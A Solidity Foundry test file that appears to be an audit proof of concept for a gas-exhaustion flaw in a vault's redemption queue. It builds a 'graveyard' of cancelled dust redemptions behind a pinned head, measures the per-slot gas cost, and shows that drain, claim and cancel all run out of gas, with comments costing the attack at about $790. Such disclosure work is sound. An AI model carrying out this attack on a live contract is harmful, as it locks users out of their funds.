// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {HollarBaseVault} from "../../../src/psm/HollarBaseVault.sol";
import {IHollarBaseVault} from "../../../src/psm/interfaces/IHollarBaseVault.sol";
import {PsmPayload} from "../../../src/psm/lib/PsmPayload.sol";
import {RateLimiter} from "../../../src/psm/lib/RateLimiter.sol";
import {
    MockAToken,
    MockAaveOracle,
    MockAavePool,
    MockAddressesProvider,
    MockAggregator,
    MockCappedAdapter,
    MockToken,
    MockWormholeCore,
    VaaBuilder
} from "../mocks/PsmMocks.sol";

/// @notice `cancelQueuedRedemption` zeroes a queue slot but never removes it, and both
///         `_advanceHead` and `_liveHead` walk every dead slot in one unbounded loop.
///         Pile up enough of them behind a live head and claim/drain/cancel all OOG.
abstract contract GraveyardFixture is Test, IHollarBaseVault {
    HollarBaseVault internal vault;
    MockToken internal usdc;
    MockAToken internal aUsdc;
    MockAavePool internal pool;
    MockWormholeCore internal wormhole;

    uint16 internal constant BASE_CHAIN = 30;
    uint16 internal constant HYDRATION_CHAIN = 73;
    bytes32 internal constant HYDRATION_EMITTER = bytes32(uint256(0x4bd7a));
    uint256 internal constant MIN_PRICE = 99e6;

    address internal admin = makeAddr("admin");
    address internal guardian = makeAddr("guardian");
    address internal treasurer = makeAddr("treasurer");
    address internal alice = makeAddr("alice");
    address internal mallory = makeAddr("mallory");

    uint256 internal victim;

    /// how many cancelled slots to leave behind the head
    function deadSlots() internal pure virtual returns (uint256);

    function setUp() public {
        vm.pauseGasMetering(); // building the fixture is not what we measure

        vm.warp(365 days);
        wormhole = new MockWormholeCore(BASE_CHAIN, 0);
        usdc = new MockToken("USDC", 6);
        aUsdc = new MockAToken();
        pool = new MockAavePool(usdc, aUsdc);
        MockAggregator agg = new MockAggregator(1e8);
        MockAddressesProvider provider =
            new MockAddressesProvider(address(pool), address(new MockAaveOracle(address(new MockCappedAdapter(agg)), agg)));

        vault = HollarBaseVault(
            address(
                new ERC1967Proxy(
                    address(new HollarBaseVault()),
                    abi.encodeCall(
                        HollarBaseVault.initializeVault,
                        VaultInit({
                            wormhole: address(wormhole),
                            usdc: address(usdc),
                            aUsdc: address(aUsdc),
                            addressesProvider: address(provider),
                            hydrationChainId: HYDRATION_CHAIN,
                            minUsdcPrice: MIN_PRICE,
                            admin: admin,
                            guardian: guardian,
                            treasurer: treasurer
                        })
                    )
                )
            )
        );

        vm.startPrank(admin);
        vault.setHydrationEmitter(HYDRATION_EMITTER);
        vault.setDepositLimit(RateLimiter.UNLIMITED, 0);
        vm.stopPrank();
        vm.prank(guardian);
        vault.setDepositsPaused(false);

        usdc.mint(alice, 10_000_000e6);
        vm.startPrank(alice);
        usdc.approve(address(vault), type(uint256).max);
        vault.deposit(1_000_000e6, PsmPayload.fromAddress(alice));
        vm.stopPrank();

        uint256 n = deadSlots();

        // slot 0: mallory's own live credit. Pins the head so nothing can advance.
        vault.receiveMessage(_vaa(mallory, 1e6, 0));

        // slots 1..n: dust redeems. There is no minimum redemption size.
        for (uint256 i = 1; i <= n; i++) {
            vault.receiveMessage(_vaa(mallory, 1, i));
        }

        // Cancel descending, so the _advanceHead inside cancel never reaches them.
        vm.startPrank(mallory);
        for (uint256 i = n; i >= 1; i--) {
            vault.cancelQueuedRedemption(i);
        }
        vm.stopPrank();

        // slot n+1: a real user, queued behind the graveyard.
        victim = n + 1;
        vault.receiveMessage(_vaa(alice, 50_000e6, type(uint256).max));

        vm.resumeGasMetering();
    }

    function _vaa(address to, uint256 amount, uint256 salt) internal pure returns (bytes memory) {
        return VaaBuilder.buildSalted(
            HYDRATION_CHAIN,
            HYDRATION_EMITTER,
            PsmPayload.encode(PsmPayload.KIND_REDEEM, PsmPayload.fromAddress(to), amount),
            salt
        );
    }
}

contract QueueGraveyardMechanismTest is GraveyardFixture {
    function deadSlots() internal pure override returns (uint256) {
        return 3;
    }

    function test_cancelLeavesHolesTheHeadMustCrossInOneCall() public {
        assertEq(vault.queueHead(), 0, "head pinned by mallory's live credit");
        assertEq(vault.queueTail(), victim + 1);

        // _settle moves the head itself, so this call never touches the graveyard.
        vault.drain(1);
        assertEq(vault.queueHead(), 1, "head now parked at the first dead slot");

        // Only crossing is all-or-nothing: _advanceHead has no step bound.
        (address next,) = vault.queueHeadEntry();
        assertEq(next, alice, "_liveHead scanned across all three holes");

        vault.drain(1);
        assertEq(vault.queueHead(), victim + 1, "head jumped the whole run in one call");
        assertEq(vault.owed(alice), 0, "victim paid");
    }
}

contract QueueGraveyardCostTest is GraveyardFixture {
    uint256 internal constant N = 1_500;

    function deadSlots() internal pure override returns (uint256) {
        return N;
    }

    /// setUp is its own tx, so the slots are cold here - same pricing a real drain pays.
    function test_walkCostIsLinearInDeadSlots() public {
        vault.drain(1); // pay the head, park queueHead in front of the graveyard

        uint256 before = gasleft();
        vault.drain(1); // this one crosses all N
        uint256 used = before - gasleft();
        uint256 perSlot = used / N;

        emit log_named_uint("dead slots", N);
        emit log_named_uint("gas for one drain(1) crossing them", used);
        emit log_named_uint("gas per dead slot (cold)", perSlot);
        emit log_named_uint("dead slots past a 5M-gas claim()", 5_000_000 / perSlot);
        emit log_named_uint("dead slots past a 30M-gas tx", 30_000_000 / perSlot);
        emit log_named_uint("dead slots past a 400M-gas tx (a whole Base block)", 400_000_000 / perSlot);

        assertGt(perSlot, 1_800, "one cold SLOAD per dead slot, nothing caps it");
        assertGt(used, N * 1_800);
    }
}

contract QueueGraveyardBrickTest is GraveyardFixture {
    /// Base's block gas limit is 400M, so at ~2.34k gas/slot the brick threshold is
    /// ~171k. 185k clears it. Costs the attacker ~$790 of Base gas and gets every
    /// cent of principal back, because each cancel re-mints the HOLLAR. ~15s to build.
    uint256 internal constant N = 185_000;

    function deadSlots() internal pure override returns (uint256) {
        return N;
    }

    function test_queueIsBrickedForEveryone() public {
        vault.drain(1); // pay the head; the graveyard is now directly ahead

        // 400M = a whole Base block. drain's maxEntries does not help: _advanceHead
        // runs before the loop.
        (bool drained,) = address(vault).call{gas: 400_000_000}(abi.encodeCall(HollarBaseVault.drain, (1)));
        (bool drainedZero,) = address(vault).call{gas: 400_000_000}(abi.encodeCall(HollarBaseVault.drain, (0)));
        (bool claimed,) = address(vault).call{gas: 400_000_000}(abi.encodeCall(HollarBaseVault.claim, ()));
        assertFalse(drained, "drain(1) OOG");
        assertFalse(drainedZero, "drain(0) OOG");
        assertFalse(claimed, "claim() OOG");

        // The documented escape from a stalled queue is gone too - cancel calls
        // _advanceHead as well.
        vm.prank(alice);
        (bool cancelled,) =
            address(vault).call{gas: 400_000_000}(abi.encodeCall(HollarBaseVault.cancelQueuedRedemption, (victim)));
        assertFalse(cancelled, "cancelQueuedRedemption OOG");

        // Credits keep landing, so liabilities keep growing with no way to pay them.
        assertEq(vault.owed(alice), 50_000e6 - (50_000e6 * 5) / 10_000, "still owed");
        vault.receiveMessage(_vaa(alice, 1_000e6, 1));
        assertGt(vault.queueTail(), victim + 1);
    }
}
